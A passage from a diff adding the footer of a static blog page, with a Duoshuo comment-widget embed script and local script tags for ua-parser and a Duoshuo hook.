+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
